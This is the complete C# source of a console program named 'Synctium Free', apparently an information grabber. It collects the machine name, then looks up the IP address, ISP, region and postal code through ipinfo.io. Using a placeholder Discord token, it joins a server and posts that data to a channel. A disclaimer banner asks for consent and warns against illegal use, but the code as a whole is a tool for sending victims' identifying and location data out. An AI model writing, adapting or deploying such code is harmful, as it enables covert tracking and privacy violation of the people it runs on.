using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Script.Serialization;

namespace Synctium_Free
{
    class Program
    {
        public static string invite;
        public static string channelid;
        public static string empty = string.Empty;
        public static string token = "Your Token here";
        public static string Machine_Name = string.Empty;
        public static string Country = string.Empty;
        public static string IP = string.Empty;
        public static string Location = string.Empty;
        public static string RealRegion = string.Empty;
        public static string Org = string.Empty;
        public static string City = string.Empty;
        public static string Postal = string.Empty;






        public class IpInfo
        {
            public string Country { get; set; }
            [JsonProperty("ip")]
            public string Ip { get; set; }

            [JsonProperty("hostname")]
            public string Hostname { get; set; }

            [JsonProperty("city")]
            public string City { get; set; }

            [JsonProperty("region")]
            public string Region { get; set; }

            //[JsonProperty("country")]
            //public string Country { get; set; }

            [JsonProperty("loc")]
            public string Loc { get; set; }

            [JsonProperty("org")]
            public string Org { get; set; }

            [JsonProperty("postal")]
            public string Postal { get; set; }
        }
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Synctium is a FREE and open source program made by: Sehyn.");
            Console.WriteLine("This program shall NOT be used for ILLEGAL activities.");
            Console.WriteLine("Program is distributed as it, your usage is your own responsability.");
            Console.WriteLine("If you agree, press any key to continue othewise please close the program.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;

            Console.ReadKey();
            Console.Clear();
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Getting informations from client..");
            Console.WriteLine("-------------------------------------------------------------------------------------------");

            Get_Information();
        }
        private static void Get_Information()
        {
            Machine_Name = System.Environment.MachineName;
            IpInfo ipInfo = new IpInfo();

            string info = new WebClient().DownloadString("http://ipinfo.io");

            JavaScriptSerializer jsonObject = new JavaScriptSerializer();
            ipInfo = jsonObject.Deserialize<IpInfo>(info);

            RegionInfo region = new RegionInfo(ipInfo.Country);
            RealRegion = (ipInfo.Region);
            IP = (ipInfo.Ip);
            Org = (ipInfo.Org);
            City = (ipInfo.City);
            Postal = (ipInfo.Postal);
            if (Postal == empty)
            {
                Postal = "Not found.";
            }
            if (Postal == " ")
            {
                Postal = "Not found.";
            }
            if (Postal == "")
            {
                Postal = "Not found.";
            }
            //Console.WriteLine(Postal);
            //Console.ReadKey();

            //Console.WriteLine(RealRegion);
            //Console.WriteLine(IP);
            //Console.WriteLine(Org);
            //Console.WriteLine(City);
            //Console.WriteLine(Postal);
            //Console.WriteLine("STOP");
            //Console.ReadKey();

            //Console.WriteLine(region.EnglishName);
            if (region.EnglishName.Contains("France"))
            {
                Country = ":flag_fr:";
            }
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Sending Informations over server.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");

            Send_Information();


        }

        private static void Send_Information()
        {
            invite = "Your Invite code (NOT URL)";
            channelid = "Channel ID";

            Discord.funcs.joinguild(token, invite, false, null);
          
            Discord.funcs.sendmessage(token, channelid, "**[Machine Name] - ** " + Machine_Name + "\r\n" + "**[Country] - ** " + Country + "\r\n" + "**[Postal Code] - ** " + Postal + "\r\n" + "**[ISP] - ** " + Org + "\r\n" + "**[IP Address] - ** " + IP , false, false);
            //Discord.funcs.sendmessage(token, channelid, "**[Country] - ** " + Country, false, false);
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Sent.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");

            Console.ReadKey();



        }
    }
}
